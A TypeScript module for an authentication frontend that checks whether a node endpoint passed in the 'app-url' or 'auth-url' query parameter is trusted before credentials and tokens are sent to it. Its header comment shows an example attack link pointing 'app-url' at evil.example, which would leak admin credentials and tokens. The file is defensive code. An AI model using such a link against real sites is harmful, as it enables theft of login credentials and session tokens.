// Trust gate for the node endpoint the auth frontend talks to (`app-url` /
// `auth-url` query params).
//
// Every call this UI makes goes to that endpoint: the username/password login
// (POST /auth/token), the session probe (HEAD /auth/validate, carrying the
// stored admin access token), mero-js's automatic refresh (POST /auth/refresh,
// carrying the refresh token) and the client-key mint. Taking it from the URL
// unvalidated meant a link like
//
//   https://<node>/auth/?app-url=https://evil.example
//
// rendered the genuine login page on the genuine node origin and posted the
// admin credentials to evil.example — and, for a user already logged in,
// leaked the admin token pair with no click at all.
//
// Trust policy, mirroring the callback-url policy in callbackUrl.ts:
//   * scheme must be http/https
//   * the auth frontend's own origin (the node serving it) is always allowed
//   * loopback hosts are allowed when the page itself is served from loopback
//     (desktop app, local dev against a local node)
//   * any other node origin must be allowlisted at build time via
//     `VITE_ALLOWED_NODE_ORIGINS` (comma-separated), e.g. for a hosted
//     auth frontend pointed at remote nodes
//   * everything else is rejected — the caller falls back to its own origin.

export const isLoopbackHost = (host: string): boolean => {
  const h = host.toLowerCase();
  return (
    h === 'localhost' ||
    h === '127.0.0.1' ||
    h === '::1' ||
    h === '[::1]' ||
    h.endsWith('.localhost')
  );
};

/** Is the node serving this page itself on loopback (desktop, local dev)? */
export const nodeIsLoopback = (): boolean => {
  try {
    return isLoopbackHost(new URL(window.location.origin).hostname);
  } catch {
    return false;
  }
};

const configuredNodeOrigins = (): Set<string> => {
  const origins = new Set<string>();
  const configured = import.meta.env.VITE_ALLOWED_NODE_ORIGINS as string | undefined;
  if (!configured) return origins;

  for (const raw of configured.split(',')) {
    const trimmed = raw.trim();
    if (!trimmed) continue;
    try {
      origins.add(new URL(trimmed).origin);
    } catch {
      /* ignore a malformed allowlist entry */
    }
  }
  return origins;
};

/**
 * Is `raw` a node endpoint this UI may send credentials and tokens to?
 *
 * @returns `raw` unchanged when trusted, `null` otherwise. On `null` the caller
 *   must NOT use it as an endpoint.
 */
export function resolveTrustedNodeUrl(raw: string | null | undefined): string | null {
  if (!raw) return null;

  let url: URL;
  try {
    url = new URL(raw);
  } catch {
    return null;
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return null;

  if (url.origin === window.location.origin) return raw;
  if (isLoopbackHost(url.hostname) && nodeIsLoopback()) return raw;
  if (configuredNodeOrigins().has(url.origin)) return raw;

  return null;
}
